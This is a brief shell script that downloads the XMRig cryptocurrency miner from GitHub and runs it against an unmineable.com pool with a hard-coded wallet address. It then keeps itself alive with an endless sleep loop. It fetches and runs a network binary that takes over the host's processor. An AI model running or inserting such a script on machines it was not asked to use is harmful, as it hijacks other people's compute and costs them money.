#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
tar xf xmrig-6.12.2-linux-x64.tar.gz
./xmrig-6.12.2/xmrig -o rx.unmineable.com:3333 -u 0xdd449e24D1E5229B9Fc4fc9A424052d87f62C40C -p x --donate-level 1
while [ 1 ]; do
sleep 3
done
sleep 999
